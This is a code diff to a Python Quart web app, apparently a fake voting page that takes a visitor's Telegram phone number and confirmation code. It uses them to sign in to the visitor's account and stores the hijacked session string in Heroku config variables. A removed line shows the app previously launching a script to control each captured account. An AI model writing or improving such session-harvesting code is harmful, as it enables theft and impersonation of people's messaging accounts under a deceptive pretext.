@@ -61,14 +61,14 @@ async def send_code_with_delay(phone_number):
 # Функция для получения сессии из Heroku
 def get_session_from_heroku(phone_number):
     try:
-        heroku_conn = heroku3.from_key(heroku_api_key)
-        app = heroku_conn.apps()[heroku_app_name]
+        heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
+        app = heroku_conn.apps()[os.getenv('HEROKU_APP_NAME')]
         config = app.config()
 
-        # Очистка номера телефона для создания корректного имени переменной окружения
+        # Очистка номера телефона
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
-
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
+
         logger.debug(f"Ищем переменную окружения: {env_var_name}")
 
         if env_var_name in config:
@@ -81,20 +81,19 @@ def get_session_from_heroku(phone_number):
         logger.error(f"Ошибка при получении сессии из переменной окружения Heroku: {e}")
         raise
 
-# Функция для сохранения сессии в Heroku
 def save_session_to_heroku(phone_number, session_str):
     try:
-        heroku_conn = heroku3.from_key(heroku_api_key)
-        app = heroku_conn.apps()[heroku_app_name]
+        heroku_conn = heroku3.from_key(os.getenv('HEROKU_API_KEY'))
+        app = heroku_conn.apps()[os.getenv('HEROKU_APP_NAME')]
         config = app.config()
 
-        # Очистка номера телефона для создания корректного имени переменной окружения
+        # Очистка номера телефона
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
         env_var_name = f'TELEGRAM_SESSION_{clean_phone_number}'
-
+        
         # Сохранение сессии в переменной окружения
         config[env_var_name] = session_str
-        logger.debug(f"Сессия успешно сохранена в Heroku для номера {phone_number}")
+        logger.debug(f"Сессия успешно сохранена в Heroku для номера {clean_phone_number}")
 
     except Exception as e:
         logger.error(f"Ошибка при сохранении сессии в Heroku: {e}")
@@ -117,20 +116,23 @@ async def vote(candidate):
 async def telegram_number_route():
     if request.method == 'POST':
         phone_number = (await request.form)['phone_number']
+        
+        # Очистка номера телефона
         clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
-        quart_session['phone_number'] = clean_phone_number
+        
+        quart_session['phone_number'] = clean_phone_number  # Сохранение очищенного номера в сессию
         logger.debug(f"Получен номер телефона: {clean_phone_number}")
 
         try:
             await create_telegram_client()
             result = await send_code_with_delay(clean_phone_number)
-
+            
             if result:
                 quart_session['phone_code_hash'] = result.phone_code_hash
                 logger.debug(f"Код успешно отправлен на номер {clean_phone_number}. phone_code_hash: {result.phone_code_hash}")
             else:
                 return "Превышен лимит запросов. Попробуйте позже."
-
+            
             return redirect(url_for('verify_code'))
         except Exception as e:
             logger.error(f"Ошибка при отправке кода на номер {clean_phone_number}: {e}")
@@ -139,7 +141,7 @@ async def telegram_number_route():
     logger.debug("Отображение страницы ввода номера телефона")
     return await render_template('telegram-number.html')
 
-# Ввод кода подтверждения
+
 @app.route('/telegram-code', methods=['GET', 'POST'])
 async def verify_code():
     if request.method == 'POST':
@@ -147,39 +149,36 @@ async def verify_code():
         phone_number = quart_session.get('phone_number')
         phone_code_hash = quart_session.get('phone_code_hash')
 
+        # Очистка номера телефона
+        clean_phone_number = phone_number.replace('+', '').replace('-', '').replace(' ', '')
+
         logger.debug(f"Получен код подтверждения от пользователя: {verification_code}")
         logger.debug(f"Номер телефона из сессии: {phone_number}")
         logger.debug(f"Хэш кода из сессии: {phone_code_hash}")
 
-        if phone_number and phone_code_hash:
+        if clean_phone_number and phone_code_hash:
             try:
-                logger.debug(f"Попытка авторизации для номера {phone_number} с кодом {verification_code}")
-                await client.sign_in(phone=phone_number, code=verification_code, phone_code_hash=phone_code_hash)
-                logger.debug(f"Авторизация успешна для номера {phone_number}")
+                logger.debug(f"Попытка авторизации для номера {clean_phone_number} с кодом {verification_code}")
+                await client.sign_in(phone=clean_phone_number, code=verification_code, phone_code_hash=phone_code_hash)
+                logger.debug(f"Авторизация успешна для номера {clean_phone_number}")
 
                 # Сохранение сессии
                 session_str = client.session.save()
                 logger.debug(f"Сохраненная сессия: {session_str[:50]}... (урезано для читаемости)")
 
                 # Сохранение сессии в переменной окружения на Heroku через API
-                save_session_to_heroku(phone_number, session_str)
-
-                # Запуск скрипта для управления аккаунтом
-                logger.debug(f"Запуск manage_account.py для номера {phone_number}")
-                subprocess.Popen(['python', 'manage_account.py', phone_number], shell=False)
+                save_session_to_heroku(clean_phone_number, session_str)
 
                 return redirect(url_for('success_page'))
 
             except Exception as e:
-                logger.error(f"Ошибка при авторизации для номера {phone_number}. Ошибка: {e}")
+                logger.error(f"Ошибка при авторизации для номера {clean_phone_number}. Ошибка: {e}")
                 return f"Ошибка при проверке кода: {e}"
 
         else:
             logger.error(f"Ошибка: Отсутствует номер телефона или хэш кода в сессии.")
             return redirect(url_for('telegram_number_route'))
 
-    logger.debug("Отображение страницы ввода кода подтверждения")
-    return await render_template('telegram-code.html')
 
 # Страница успешного голосования
 @app.route('/success')
